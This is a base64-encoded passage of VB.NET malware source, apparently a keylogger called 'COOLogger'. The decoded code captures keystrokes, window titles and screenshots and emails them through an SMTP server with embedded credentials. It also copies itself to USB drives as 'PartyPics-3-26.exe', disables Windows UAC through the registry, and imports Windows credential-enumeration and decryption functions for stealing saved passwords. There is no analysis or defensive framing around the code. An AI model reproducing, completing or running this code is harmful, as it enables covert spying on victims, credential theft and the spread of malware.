DQogICAgICAgICAgICBFbHNlSWYgR2V0QXN5bmNLZXlTdGF0ZSgzMikgPSAtMzI3NjcgVGhlbg0K ICAgICAgICAgICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQgKyAiICINCiAgICAgICAgICAgIEVs c2VJZiBHZXRBc3luY0tleVN0YXRlKDEzKSA9IC0zMjc2NyBUaGVuDQogICAgICAgICAgICAgICBb NTRdLlRleHQgPVs1NF0uVGV4dCArIHZiTmV3TGluZQ0KICAgICAgICAgICAgRWxzZUlmIEdldEFz eW5jS2V5U3RhdGUoOCkgPSAtMzI3NjcgVGhlbg0KICAgICAgICAgICAgICAgIElmIE5vdCBbNTRd LlRleHQuRW5kc1dpdGgodmJOZXdMaW5lKSBUaGVuDQogICAgICAgICAgICAgICAgICAgIElmIE5v dCBbNTRdLlRleHQuRW5kc1dpdGgoIn4iKSBUaGVuDQogICAgICAgICAgICAgICAgICAgICAgICBJ ZiBOb3QgWzU0XS5UZXh0LkVuZHNXaXRoKCIpIikgVGhlbg0KICAgICAgICAgICAgICAgICAgICAg ICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQuU3Vic3RyaW5nKDAsWzU0XS5UZXh0Lkxlbmd0aCAt IDEpDQogICAgICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICAgICAg RW5kIElmDQogICAgICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICBFbHNlSWYgR2V0QXN5 bmNLZXlTdGF0ZSg0OSkgPSAtMzI3NjcgVGhlbg0KICAgICAgICAgICAgICAgWzU0XS5UZXh0ID1b NTRdLlRleHQgKyAiMSINCiAgICAgICAgICAgIEVsc2VJZiBHZXRBc3luY0tleVN0YXRlKDUwKSA9 IC0zMjc2NyBUaGVuDQogICAgICAgICAgICAgICBbNTRdLlRleHQgPVs1NF0uVGV4dCArICIyIg0K ICAgICAgICAgICAgRWxzZUlmIEdldEFzeW5jS2V5U3RhdGUoNTEpID0gLTMyNzY3IFRoZW4NCiAg ICAgICAgICAgICAgIFs1NF0uVGV4dCA9WzU0XS5UZXh0ICsgIjMiDQogICAgICAgICAgICBFbHNl SWYgR2V0QXN5bmNLZXlTdGF0ZSg1MikgPSAtMzI3NjcgVGhlbg0KICAgICAgICAgICAgICAgWzU0 XS5UZXh0ID1bNTRdLlRleHQgKyAiNCINCiAgICAgICAgICAgIEVsc2VJZiBHZXRBc3luY0tleVN0 YXRlKDUzKSA9IC0zMjc2NyBUaGVuDQogICAgICAgICAgICAgICBbNTRdLlRleHQgPVs1NF0uVGV4 dCArICI1Ig0KICAgICAgICAgICAgRWxzZUlmIEdldEFzeW5jS2V5U3RhdGUoNTQpID0gLTMyNzY3 IFRoZW4NCiAgICAgICAgICAgICAgIFs1NF0uVGV4dCA9WzU0XS5UZXh0ICsgIjYiDQogICAgICAg ICAgICBFbHNlSWYgR2V0QXN5bmNLZXlTdGF0ZSg1NSkgPSAtMzI3NjcgVGhlbg0KICAgICAgICAg ICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQgKyAiNyINCiAgICAgICAgICAgIEVsc2VJZiBHZXRB c3luY0tleVN0YXRlKDU2KSA9IC0zMjc2NyBUaGVuDQogICAgICAgICAgICAgICBbNTRdLlRleHQg PVs1NF0uVGV4dCArICI4Ig0KICAgICAgICAgICAgRWxzZUlmIEdldEFzeW5jS2V5U3RhdGUoNTcp ID0gLTMyNzY3IFRoZW4NCiAgICAgICAgICAgICAgIFs1NF0uVGV4dCA9WzU0XS5UZXh0ICsgIjki DQogICAgICAgICAgICBFbHNlSWYgR2V0QXN5bmNLZXlTdGF0ZSg0OCkgPSAtMzI3NjcgVGhlbg0K ICAgICAgICAgICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQgKyAiMCINCiAgICAgICAgICAgIEVs c2VJZiBHZXRBc3luY0tleVN0YXRlKDIyMikgPSAtMzI3NjcgVGhlbg0KICAgICAgICAgICAgICAg WzU0XS5UZXh0ID1bNTRdLlRleHQgKyAiJyINCiAgICAgICAgICAgIEVsc2VJZiBHZXRBc3luY0tl eVN0YXRlKDE4OSkgPSAtMzI3NjcgVGhlbg0KICAgICAgICAgICAgICAgWzU0XS5UZXh0ID1bNTRd LlRleHQgKyAiLSINCiAgICAgICAgICAgIEVsc2VJZiBHZXRBc3luY0tleVN0YXRlKDE4OCkgPSAt MzI3NjcgVGhlbg0KICAgICAgICAgICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQgKyAiLCINCiAg ICAgICAgICAgIEVsc2VJZiBHZXRBc3luY0tleVN0YXRlKDE5MCkgPSAtMzI3NjcgVGhlbg0KICAg ICAgICAgICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQgKyAiLiINCiAgICAgICAgICAgIEVsc2VJ ZiBHZXRBc3luY0tleVN0YXRlKDE5MSkgPSAtMzI3NjcgVGhlbg0KICAgICAgICAgICAgICAgWzU0 XS5UZXh0ID1bNTRdLlRleHQgKyAiLyINCiAgICAgICAgICAgIEVsc2VJZiBHZXRBc3luY0tleVN0 YXRlKDIxOSkgPSAtMzI3NjcgVGhlbg0KICAgICAgICAgICAgICAgWzU0XS5UZXh0ID1bNTRdLlRl eHQgKyAiWyINCiAgICAgICAgICAgIEVsc2VJZiBHZXRBc3luY0tleVN0YXRlKDIyMSkgPSAtMzI3 NjcgVGhlbg0KICAgICAgICAgICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQgKyAiXSINCiAgICAg ICAgICAgIEVsc2VJZiBHZXRBc3luY0tleVN0YXRlKDE4NikgPSAtMzI3NjcgVGhlbg0KICAgICAg ICAgICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQgKyAiOyINCiAgICAgICAgICAgIEVsc2VJZiBH ZXRBc3luY0tleVN0YXRlKDE4NykgPSAtMzI3NjcgVGhlbg0KICAgICAgICAgICAgICAgWzU0XS5U ZXh0ID1bNTRdLlRleHQgKyAiPSINCiAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICBFbmQgSWYN CiAgICAgICAgRW5kIFN1Yg0KUHJpdmF0ZSBTdWIgbXV0ZXgoKQ0KICAgICAgICBUcnkNCiAgICAg ICAgICAgIFN5c3RlbS5UaHJlYWRpbmcuTXV0ZXguT3BlbkV4aXN0aW5nKCIqbXV0ZXgqIikNCiAg ICAgICAgICAgIEVuZA0KICAgICAgICBDYXRjaCBleCBBcyBFeGNlcHRpb24NCiAgICAgICAgICAg IFsxMzRdID0gTmV3IFN5c3RlbS5UaHJlYWRpbmcuTXV0ZXgoRmFsc2UsICIqbXV0ZXgqIikNCiAg ICAgICAgICAgIEV4aXQgU3ViDQogICAgICAgIEVuZCBUcnkNCiAgICBFbmQgU3ViDQpTdWIgWzIx XV9UaWNrZWQoQnlWYWwgc2VuZGVyIEFzIFN5c3RlbS5PYmplY3QsIEJ5VmFsIGUgQXMgU3lzdGVt LkV2ZW50QXJncykNCiAgICAgICAgSWYgWzU1XSA8PiBbMTZdKCkgVGhlbg0KICAgICAgICAgICAg WzU1XSA9IFsxNl0oKQ0KICAgICAgICAgICAgSWYgWzU1XSA8PiAiIiBUaGVuDQogICAgICAgICAg ICAgICAgWzU0XS5UZXh0ICs9IHZiTmV3TGluZSArIHZiTmV3TGluZSArICJ+fn5+fiIgJiBbNTVd ICYgIiAoIiAmIE5vdy5Ub0xvbmdUaW1lU3RyaW5nICYgIil+fn5+fiIgKyB2Yk5ld0xpbmUNCiAg ICAgICAgICAgIEVuZCBJZg0KICAgICAgICBFbmQgSWYNCiAgICBFbmQgU3ViDQogICAgUHVibGlj IEZ1bmN0aW9uIFs1N10oQnlWYWwgbGVuZ2h0IEFzIEludGVnZXIpIEFzIFN0cmluZw0KICAgICAg ICBSYW5kb21pemUoKQ0KICAgICAgICBEaW0gcyBBcyBOZXcgU3lzdGVtLlRleHQuU3RyaW5nQnVp bGRlcigiIikNCiAgICAgICAgRGltIGIoKSBBcyBDaGFyID0gIkFCQ0RFRkdISUpLTE1OT1BRUlNU VVZXWFlaYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoiLlRvQ2hhckFycmF5KCkNCiAgICAgICAg Rm9yIGkgIEFzIEludGVnZXIgPSAxIFRvIGxlbmdodA0KICAgICAgICAgICAgUmFuZG9taXplKCkN CiAgICAgICAgICAgIERpbSB6IEFzIEludGVnZXIgPSBJbnQoKChiLkxlbmd0aCAtIDIpIC0gMCAr IDEpICogUm5kKCkpICsgMQ0KICAgICAgICAgICAgcy5BcHBlbmQoYih6KSkNCiAgICAgICAgTmV4 dA0KICAgICAgICBSZXR1cm4gcy5Ub1N0cmluZw0KICAgIEVuZCBGdW5jdGlvbg0KDQpQdWJsaWMg RnVuY3Rpb24gc21haWwoKSBhcyBzdHJpbmcNCnRyeQ0KRGltIFs0Nl0gQXMgU2l6ZSA9IE5ldyBT aXplKE15LkNvbXB1dGVyLlNjcmVlbi5Cb3VuZHMuV2lkdGgsIE15LkNvbXB1dGVyLlNjcmVlbi5C b3VuZHMuSGVpZ2h0KQ0KICAgICAgICAgICAgRGltIFs0N10gQXMgTmV3IEJpdG1hcChNeS5Db21w dXRlci5TY3JlZW4uQm91bmRzLldpZHRoLCBNeS5Db21wdXRlci5TY3JlZW4uQm91bmRzLkhlaWdo dCkNCiAgICAgICAgICAgIERpbSBbNDhdIEFzIFN5c3RlbS5EcmF3aW5nLkdyYXBoaWNzID0gU3lz dGVtLkRyYXdpbmcuR3JhcGhpY3MuRnJvbUltYWdlKFs0N10pDQogICAgICAgICAgICBbNDhdLkNv cHlGcm9tU2NyZWVuKE5ldyBQb2ludCgwLCAwKSwgTmV3IFBvaW50KDAsIDApLCBbNDZdKQ0KICAg ICAgICAgICAgZGltIFs1Nl0gYXMgc3RyaW5nID0gWzU3XSg2KQ0KICAgICAgICAgICAgWzQ3XS5T YXZlKFsyOV0gJiAiXCIgJiBbNTZdICYgIi5qcGVnIikNCiAgICAgICAgICAgIERpbSBbMzRdIEFz IE5ldyBNYWlsTWVzc2FnZSgpDQogICAgICAgICAgICBEaW0gWzM1XSBBcyBOZXcgQXR0YWNobWVu dChbMjldICYgIlwiICYgWzU2XSAmICIuanBlZyIpDQogICAgICAgICAgICBbMzRdLkZyb20gPSBO ZXcgTWFpbEFkZHJlc3MoWzYyXS5bNjNdKFs2NF0oWzQyXShbMjVdKSkpKQ0KICAgICAgICAgICAg WzM0XS5Uby5BZGQoWzYyXS5bNjNdKFs2NF0oWzQyXShbMjVdKSkpKQ0KICAgICAgICAgICAgWzM0 XS5TdWJqZWN0ID0gIkNPT0xvZ2dlciBMb2dzIEZyb20gLSAiICYgU3lzdGVtLkVudmlyb25tZW50 LlVzZXJOYW1lDQogICAgICAgICAgICBbMzRdLkJvZHkgPSAoIn5+fn5+S2V5bG9nZ2Vyfn5+fn4i ICYgdmJuZXdsaW5lICYgdmJuZXdsaW5lICYgdmJuZXdsaW5lICYgWzU0XS5UZXh0ICYgdmJuZXds aW5lICYgdmJuZXdsaW5lICYgIlJlbW92YWwgSUQ6ICIgJiBNQUNHVUlELnRvc3RyaW5nKQ0KICAg ICAgICAgICAgWzM0XS5BdHRhY2htZW50cy5BZGQoWzM1XSkNCiAgICAgICAgICAgIERpbSBbMzZd IEFzIE5ldyBTbXRwQ2xpZW50KCIqaG9zdCoiKQ0KICAgICAgICAgICAgWzM2XS5Qb3J0ID0gKnBv cnQqDQogICAgICAgICAgICBbMzZdLkVuYWJsZVNzbCA9IFRydWUNCiAgICAgICAgICAgIFszNl0u Q3JlZGVudGlhbHMgPSBOZXcgU3lzdGVtLk5ldC5OZXR3b3JrQ3JlZGVudGlhbChbNjJdLls2M10o WzY0XShbNDJdKFsyNV0pKSksIChbNjJdLls2M10oWzY0XShbNDJdKFsyNl0pKSkpKQ0KICAgICAg ICAgICAgWzM2XS5FbmFibGVTc2wgPSBUcnVlDQogICAgICAgICAgICBbMzZdLlNlbmQoWzM0XSkN CiAgICAgICAgICAgIFs1NF0uVGV4dCA9IHZiTmV3TGluZSArIHZiTmV3TGluZSArICJ+fn5+fiIg JiBbNTVdICYgIiAoIiAmIE5vdy5Ub0xvbmdUaW1lU3RyaW5nICYgIil+fn5+fiIgKyB2Yk5ld0xp bmUNCgkJCVs4OF0uVGV4dCA9ICIiDQoJCQljYXRjaCBleCBhcyBleGNlcHRpb24NCgkJCXRyeQ0K CQkJV2l0aCBbMzJdDQogIA0KICAgICAgICAgICAgICAgIC5Gcm9tID0gTmV3IE1haWxBZGRyZXNz KFs2Ml0uWzYzXShbNjRdKFs0Ml0oWzI1XSkpKSkNCiAgICAgICAgICAgICAgICAuVG8uQWRkKFs2 Ml0uWzYzXShbNjRdKFs0Ml0oWzI1XSkpKSkNCiAgICAgICAgICAgICAgICAuU3ViamVjdCA9ICJD T09Mb2dnZXIgTG9ncyBmcm9tIC0gIiAmIEVudmlyb25tZW50LlVzZXJOYW1lDQogICAgICAgICAg ICAgICAgLkJvZHkgPSAoIn5+fn5+S2V5bG9nZ2Vyfn5+fn4iICYgdmJuZXdsaW5lICYgdmJuZXds aW5lICYgdmJuZXdsaW5lICYgWzU0XS5UZXh0ICYgdmJuZXdsaW5lICYgdmJuZXdsaW5lICYgIlNj cmVlbnNob3QgZmFpbGVkIHRvIGNhcHR1cmUiICYgdmJuZXdsaW5lICYgdmJuZXdsaW5lICYgIlJl bW92YWwgSUQ6ICIgJiBNQUNHVUlELnRvc3RyaW5nKQ0KICAgICAgICAgICAgRW5kIFdpdGgNCg0K ICAgICAgICAgICAgV2l0aCBbMzddDQogICAgICAgICAgICAgICAgLkhvc3QgPSAiKmhvc3QqIg0K ICAgICAgICAgICAgICAgIC5Qb3J0ID0gKnBvcnQqDQogICAgICAgICAgICAgICAgLkVuYWJsZVNz bCA9IFRydWUNCiAgICAgICAgICAgICAgICAuQ3JlZGVudGlhbHMgPSBOZXcgU3lzdGVtLk5ldC5O ZXR3b3JrQ3JlZGVudGlhbChbNjJdLls2M10oWzY0XShbNDJdKFsyNV0pKSksIFs2Ml0uWzYzXShb NjRdKFs0Ml0oWzI2XSkpKSkNCiAgICAgICAgICAgICAgICAuU2VuZChbMzJdKQ0KICAgICAgICAg ICAgRW5kIFdpdGgNCiAgICAgICAgICAgIFs1NF0uVGV4dCA9IHZiTmV3TGluZSArIHZiTmV3TGlu ZSArICJ+fn5+fiIgJiBbNTVdICYgIiAoIiAmIE5vdy5Ub0xvbmdUaW1lU3RyaW5nICYgIil+fn5+ fiIgKyB2Yk5ld0xpbmUNCgkJCVs4OF0uVGV4dCA9ICIiDQoJCQljYXRjaCBlIGFzIGV4Y2VwdGlv biANCgkJCWVuZCB0cnkNCgkJCWVuZCB0cnkNCg0KcmV0dXJuIG5vdGhpbmcNCkVuZCBGdW5jdGlv bg0KDQpQdWJsaWMgRnVuY3Rpb24gbm1haWwgYXMgc3RyaW5nDQogICAgICANCgkJICAgDQoJCSAg IHRyeQ0KICBXaXRoIFszMl0NCiAgDQogICAgICAgICAgICAgICAgLkZyb20gPSBOZXcgTWFpbEFk ZHJlc3MoWzYyXS5bNjNdKFs2NF0oWzQyXShbMjVdKSkpKQ0KICAgICAgICAgICAgICAgIC5Uby5B ZGQoWzYyXS5bNjNdKFs2NF0oWzQyXShbMjVdKSkpKQ0KICAgICAgICAgICAgICAgIC5TdWJqZWN0 ID0gIkNPT0xvZ2dlciBMb2dzIGZyb20gLSAiICYgRW52aXJvbm1lbnQuVXNlck5hbWUNCiAgICAg ICAgICAgICAgICAuQm9keSA9ICgifn5+fn5LZXlsb2dnZXJ+fn5+fiIgJiB2Ym5ld2xpbmUgJiB2 Ym5ld2xpbmUgJiB2Ym5ld2xpbmUgJiBbNTRdLlRleHQgJiB2Ym5ld2xpbmUgJiB2Ym5ld2xpbmUg JiAiUmVtb3ZhbCBJRDogIiAmIE1BQ0dVSUQudG9zdHJpbmcpDQogICAgICAgICAgICBFbmQgV2l0 aA0KDQogICAgICAgICAgICBXaXRoIFszN10NCiAgICAgICAgICAgICAgICAuSG9zdCA9ICIqaG9z dCoiDQogICAgICAgICAgICAgICAgLlBvcnQgPSAqcG9ydCoNCiAgICAgICAgICAgICAgICAuRW5h YmxlU3NsID0gVHJ1ZQ0KICAgICAgICAgICAgICAgIC5DcmVkZW50aWFscyA9IE5ldyBTeXN0ZW0u TmV0Lk5ldHdvcmtDcmVkZW50aWFsKFs2Ml0uWzYzXShbNjRdKFs0Ml0oWzI1XSkpKSwgWzYyXS5b NjNdKFs2NF0oWzQyXShbMjZdKSkpKQ0KICAgICAgICAgICAgICAgIC5TZW5kKFszMl0pDQogICAg ICAgICAgICBFbmQgV2l0aA0KICAgICAgICAgICAgWzU0XS5UZXh0ID0gdmJOZXdMaW5lICsgdmJO ZXdMaW5lICsgIn5+fn5+IiAmIFs1NV0gJiAiICgiICYgTm93LlRvTG9uZ1RpbWVTdHJpbmcgJiAi KX5+fn5+IiArIHZiTmV3TGluZQ0KCQkJWzg4XS5UZXh0ID0gIiINCgkJCWNhdGNoIGV4IGFzIGV4 Y2VwdGlvbiANCgkJCWVuZCB0cnkNCiAgICAgICAgICAgIHJldHVybiBub3RoaW5nDQpFbmQgZnVu Y3Rpb24NClB1YmxpYyBGdW5jdGlvbiBbMTA1XSBBcyBCb29sZWFuDQogICAgICANCgkgICBEaW0g WzEwM10oKSBBcyBEcml2ZUluZm8gPSBEcml2ZUluZm8uR2V0RHJpdmVzKCkNCiAgICAgICAgRm9y IEVhY2ggWzEwNF0gQXMgRHJpdmVJbmZvIEluIFsxMDNdDQogICAgICAgICAgICBJZiBbMTA0XS5E cml2ZVR5cGUgPSAiMiIgQW5kIFsxMDRdLklzUmVhZHkgPSBUcnVlIFRoZW4NCiAgICAgICAgICAg ICAgICBTeXN0ZW0uSU8uRmlsZS5Db3B5KEFwcGxpY2F0aW9uLkV4ZWN1dGFibGVQYXRoLCBbMTA0 XS5OYW1lICYgIlBhcnR5UGljcy0zLTI2LmV4ZSIpDQogICAgICAgICAgICBFbmQgSWYNCiAgICAg ICAgTmV4dCBbMTA0XQ0KICAgICAgICBSZXR1cm4gVHJ1ZQ0KICAgIEVuZCBGdW5jdGlvbg0KDQog UHVibGljIEZ1bmN0aW9uIFs2NF0oQnlWYWwgc0lucHV0IEFzIFN0cmluZykgQXMgU3RyaW5nDQog ICAgICAgIERpbSBbNjhdIEFzIFN0cmluZyA9ICIiDQogICAgICAgIERpbSBbNzJdIEFzIFN0cmlu ZyA9ICIiDQogICAgICAgIERpbSBbNzNdIEFzIFN0cmluZyA9ICIiDQogICAgICAgIERpbSBbNzRd IEFzIEludGVnZXINCiAgICAgICAgRGltIFs3NV0gQXMgSW50ZWdlcg0KICAgICAgICBEaW0gWzc2 XSBBcyBJbnRlZ2VyDQogICAgICAgIERpbSBbNzddIEFzIEludGVnZXINCg0KICAgICAgICBbNzVd ID0gc0lucHV0Lkxlbmd0aA0KICAgICAgICBbNzddID0gWzc1XSBNb2QgMg0KICAgICAgICBbNzZd ID0gWzc1XSBcIDINCg0KICAgICAgICBGb3IgWzc0XSA9IFs3Nl0gKyBbNzddIFRvIDEgU3RlcCAt MQ0KICAgICAgICAgICAgSWYgWzc3XSA9IDAgVGhlbg0KICAgICAgICAgICAgICAgIFs2OF0gKz0g TWljcm9zb2Z0LlZpc3VhbEJhc2ljLk1pZChzSW5wdXQsIFs3NF0gKyBbNzZdLCAxKQ0KICAgICAg ICAgICAgRW5kIElmDQogICAgICAgICAgICBbNjhdICs9IE1pY3Jvc29mdC5WaXN1YWxCYXNpYy5N aWQoc0lucHV0LCBbNzRdLCAxKQ0KICAgICAgICAgICAgSWYgWzc3XSA9IDEgQW5kIFs3NF0gPD4g MSBUaGVuDQogICAgICAgICAgICAgICAgWzY4XSArPSBNaWNyb3NvZnQuVmlzdWFsQmFzaWMuTWlk KHNJbnB1dCwgWzc0XSArIFs3Nl0sIDEpDQogICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgTmV4 dA0KIFJldHVybiBbNjhdDQogICAgRW5kIEZ1bmN0aW9uDQoJDQoJc3ViIERlYWN0aXZhdGVVQUMo KQ0KICAgICAgICANCiAgICAgICAgRGltIFVBQygxKSBBcyBSZWdpc3RyeUtleQ0KDQogICAgICAg IFRyeQ0KICAgICAgICAgICAgVUFDKDApID0gUmVnaXN0cnkuTG9jYWxNYWNoaW5lLk9wZW5TdWJL ZXkoWzY0XShbMTAyXSksIFRydWUpDQogICAgICAgICAgICBVQUMoMSkgPSBSZWdpc3RyeS5DdXJy ZW50VXNlci5PcGVuU3ViS2V5KFs2NF0oWzEwMl0pLCBUcnVlKQ0KDQogICAgICAgICAgICBJZiBV QUMoMSkuR2V0VmFsdWUoIkVuYWJsZUxVQSIpIDw+IDAgVGhlbg0KICAgICAgICAgICAgICAgIFVB QygxKS5TZXRWYWx1ZSgiRW5hYmxlTFVBIiwgMCkNCiAgICAgICAgICAgICAgICBJZiBVQUMoMCku R2V0VmFsdWUoIkVuYWJsZUxVQSIpIDw+IDAgVGhlbg0KICAgICAgICAgICAgICAgICAgICBVQUMo MCkuU2V0VmFsdWUoIkVuYWJsZUxVQSIsIDApDQogICAgICAgICAgICAgICAgICAgDQogICAgICAg ICAgICAgICAgRW5kIElmDQogICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgQ2F0Y2gNCiAgICAg ICAgICAgDQogICAgICAgIEVuZCBUcnkNCiAgICBFbmQgU3ViDQoJIA0KDQpQcml2YXRlIFJlYWRP bmx5IGtleSgpIEFzIEJ5dGUgPSBfDQogIHsxLCAyLCAzLCA0LCA1LCA2LCA3LCA4LCA5LCAxMCwg MTEsIDEyLCAxMywgMTQsIF8NCiAgMTUsIDE2LCAxNywgMTgsIDE5LCAyMCwgMjEsIDIyLCAyMywg MjR9DQogICAgUHJpdmF0ZSBSZWFkT25seSBpdigpIEFzIEJ5dGUgPSB7OCwgNywgNiwgNSwgNCwg MywgMiwgMX0NCiAgICBQcml2YXRlIFs2Ml0gQXMgTmV3IFs2MV0oa2V5LCBpdikNCkVuZCBNb2R1 bGUNCg0KDQpGcmllbmQgQ2xhc3MgWzYxXQ0KUHJpdmF0ZSBbNzhdIEFzIE5ldyBUcmlwbGVERVND cnlwdG9TZXJ2aWNlUHJvdmlkZXINCiAgICBQcml2YXRlIFs3OV0gQXMgTmV3IFVURjhFbmNvZGlu Zw0KICAgIFByaXZhdGUgWzgwXSgpIEFzIEJ5dGUNCiAgICBQcml2YXRlIFs4MV0oKSBBcyBCeXRl DQpQdWJsaWMgU3ViIE5ldyhCeVZhbCBrZXkoKSBBcyBCeXRlLCBCeVZhbCBpdigpIEFzIEJ5dGUp DQogICAgICAgIE1lLls4MF0gPSBrZXkNCiAgICAgICAgTWUuWzgxXSA9IGl2DQogICAgRW5kIFN1 Yg0KUHVibGljIEZ1bmN0aW9uIFs2M10oQnlWYWwgWzgzXSgpIEFzIEJ5dGUpIEFzIEJ5dGUoKQ0K ICAgICAgICBSZXR1cm4gWzgyXShbODNdLCBbNzhdLkNyZWF0ZURlY3J5cHRvcihbODBdLCBbODFd KSkNCiAgICBFbmQgRnVuY3Rpb24NCiAgICBQdWJsaWMgRnVuY3Rpb24gWzYzXShCeVZhbCB0ZXh0 IEFzIFN0cmluZykgQXMgU3RyaW5nDQogICAgICAgIERpbSBbODNdKCkgQXMgQnl0ZSA9IENvbnZl cnQuRnJvbUJhc2U2NFN0cmluZyh0ZXh0KQ0KICAgICAgICBEaW0gWzg0XSgpIEFzIEJ5dGUgPSBb ODJdKFs4M10sIF8NCiAgICAgICAgICAgICAgICAgICAgICAgICBbNzhdLkNyZWF0ZURlY3J5cHRv cihbODBdLCBbODFdKSkNCiAgICAgICAgUmV0dXJuIFs3OV0uR2V0U3RyaW5nKFs4NF0pDQogICAg RW5kIEZ1bmN0aW9uDQogICAgDQogICAgUHJpdmF0ZSBGdW5jdGlvbiBbODJdKEJ5VmFsIFs4M10o KSBBcyBCeXRlLCBfDQogICAgICAgIEJ5VmFsIENyeXB0b1RyYW5zZm9ybSBBcyBJQ3J5cHRvVHJh bnNmb3JtKSBBcyBCeXRlKCkNCiAgICAgICAgDQoNCiAgICAgICAgRGltIFs4Nl0gQXMgTWVtb3J5 U3RyZWFtID0gTmV3IE1lbW9yeVN0cmVhbQ0KICAgICAgICBEaW0gWzg1XSBBcyBDcnlwdG9TdHJl YW0gPSBOZXcgXw0KICAgICAgICAgICAgQ3J5cHRvU3RyZWFtKFs4Nl0sIENyeXB0b1RyYW5zZm9y bSwgXw0KICAgICAgICAgICAgQ3J5cHRvU3RyZWFtTW9kZS5Xcml0ZSkNCiAgICAgICAgDQogICAg ICAgIFs4NV0uV3JpdGUoWzgzXSwgMCwgWzgzXS5MZW5ndGgpDQogICAgICAgIFs4NV0uRmx1c2hG aW5hbEJsb2NrKCkNCiAgICAgICAgDQoNCiAgICAgICAgWzg2XS5Qb3NpdGlvbiA9IDANCiAgICAg ICAgRGltIFs4N10oQ1R5cGUoWzg2XS5MZW5ndGggLSAxLCBTeXN0ZW0uSW50MzIpKSBBcyBCeXRl DQogICAgICAgIFs4Nl0uUmVhZChbODddLCAwLCBDVHlwZShbODddLkxlbmd0aCwgU3lzdGVtLklu dDMyKSkNCiAgICAgICANCg0KICAgICAgICBbODZdLkNsb3NlKCkNCiAgICAgICAgWzg1XS5DbG9z ZSgpDQogICAgICAgIA0KDQogICAgICAgIFJldHVybiBbODddDQogICAgRW5kIEZ1bmN0aW9uDQoN CkVuZCBjbGFzcw0KDQoNCg0KDQpNb2R1bGUgTVNODQogICAgPERsbEltcG9ydCgiYWR2YXBpMzIu ZGxsIiwgU2V0TGFzdEVycm9yOj1UcnVlLCBDaGFyU2V0Oj1DaGFyU2V0LlVuaWNvZGUpPiBfDQog ICAgUHVibGljIEZ1bmN0aW9uIENyZWRFbnVtZXJhdGVXKEJ5VmFsIGZpbHRlciBBcyBTdHJpbmcs IEJ5VmFsIGZsYWcgQXMgVUludGVnZXIsIEJ5VmFsIGNvdW50IEFzIFVJbnRlZ2VyLCBCeVZhbCBw Q3JlZGVudGlhbHMgQXMgSW50UHRyKSBBcyBCb29sZWFuDQogICAgRW5kIEZ1bmN0aW9uDQogICAg PERsbEltcG9ydCgiY3J5cHQzMiIsIENoYXJTZXQ6PUNoYXJTZXQuQXV0bywgU2V0TGFzdEVycm9y Oj1UcnVlKT4gXw0KICAgIEZyaWVuZCBGdW5jdGlvbiBDcnlwdFVucHJvdGVjdERhdGEoQnlSZWYg ZGF0YUluIEFzIERBVEFfQkxPQiwgQnlWYWwgcHBzekRhdGFEZXNjciBBcyBJbnRlZ2VyLCBCeVZh bCBvcHRpb25hbEVudHJvcHkgQXMgSW50ZWdlciwgQnlWYWwgcHZSZXNlcnZlZCBBcyBJbnRlZ2Vy LCBCeVZhbCBwUHJvbXB0U3RydWN0IEFzIEludGVnZXIsIEJ5VmFsIGR3RmxhZ3MgQXMgSW50ZWdl ciwgXw0KICAgICBCeVZhbCBwRGF0YU91dCBBcyBEQVRBX0JMT0IpIEFzIEJvb2xlYW4NCiAgICBF bmQgRnVuY3Rpb24NCiAgICBGcmllbmQgU3RydWN0dXJlIENSRURFTlRJQUwNCiAgICAgICAgUHVi bGljIEZsYWdzIEFzIEludGVnZXINCiAgICAgICAgUHVibGljIFR5cGUgQXMgSW50ZWdlcg0KICAg ICAgICA8TWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuTFBXU3RyKT4gXw0KICAgICAgICBQdWJsaWMg VGFyZ2V0TmFtZSBBcyBTdHJpbmcNCiAgICAgICAgPE1hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkxQ V1N0cik+IF8NCiAgICAgICAgUHVibGljIENvbW1lbnQgQXMgU3RyaW5nDQogICAgICAgIFB1Ymxp YyBMYXN0V3JpdHRlbiBBcyBMb25nDQogICAgICAgIFB1YmxpYyBDcmVkZW50aWFsQmxvYlNpemUg QXMgSW50ZWdlcg0KICAgICAgICBQdWJsaWMgQ3JlZGVudGlhbEJsb2IgQXMgSW50ZWdlcg0KICAg ICAgICBQdWJsaWMgUGVyc2lzdCBBcyBJbnRlZ2VyDQogICAgICAgIFB1YmxpYyBBdHRyaWJ1dGVD b3VudCBBcyBJbnRlZ2VyDQogICAgICAgIFB1YmxpYyBBdHRyaWJ1dGVzIEFzIEludFB0cg0KICAg ICAgICA8TWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuTFBXU3RyKT4gXw0KICAgICAgICBQdWJsaWMg VGFyZ2V0QWxpYXMgQXMgU3RyaW5nDQogICAgICAgIDxNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5M UFdTdHIpPiBfDQogICAgICAgIFB1YmxpYyBVc2VyTmFtZSBBcyBTdHJpbmcNCiAgICBFbmQgU3Ry dWN0dXJlDQogICAgUHJpdmF0ZSBDcmVkIEFzIENSRURFTlRJQUwNCiAgICBGcmllbmQgU3RydWN0 dXJlIERBVEFfQkxPQg0KICAgICAgICBQdWJsaWMgY2JEYXRhIEFzIEludGVnZXINCiAgICAgICAg UHVibGljIHBiRGF0YSBBcyBJbnRlZ2VyDQogICAgRW5kIFN0cnVjdHVyZQ0KICAgIEZyaWVuZCBT dHJ1Y3R1cmUgVXNlckRldGFpbHMNCiAgICAgICAgUHVibGljIHVOYW1lIEFzIFN0cmluZw0KICAg ICAgICBQdWJsaWMgdVBhc3MgQXMgU3RyaW5nDQogICAgRW5kIFN0cnVjdHVyZQ0KICAgIFB1Ymxp YyBjb3VudCBBcyBVSW50ZWdlcg0KICAgIFB1YmxpYyBwQ3JlZGVudGlhbHMgQXMgSW50UHRyID0g 